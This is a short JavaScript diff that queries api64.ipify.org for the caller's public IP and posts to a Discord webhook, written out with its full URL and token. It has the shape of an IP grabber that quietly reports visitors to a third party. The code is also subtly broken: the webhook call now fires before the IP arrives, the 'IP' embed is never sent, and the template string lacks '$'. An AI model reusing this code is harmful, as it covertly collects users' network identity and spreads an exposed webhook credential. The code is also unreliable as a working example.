@@ -8,20 +8,16 @@ function rqwbm(url,datax) {
 }
 
 a.open("GET","https://api64.ipify.org");
-a.onreadystatechange = function () {
-    if (this.readyState === 4) {
-        var embed = {
-            "author":"test",
-            "title":"**Info**",
-            "description":`IP: {this.responseText}`,
-        }
+var embed = {
+    "author":"test",
+    "title":"**Info**",
+    "description":`IP: {this.responseText}`,
+}
         
-        var data = {
-            "content":"bobak"
-        }
+var data = {
+    "content":"bobak"
+}
         
-        rqwbm("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",JSON.stringify({"content":"abb"}));
-    }
-};
+rqwbm("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",JSON.stringify({"content":"abb"}));
 
 a.send();
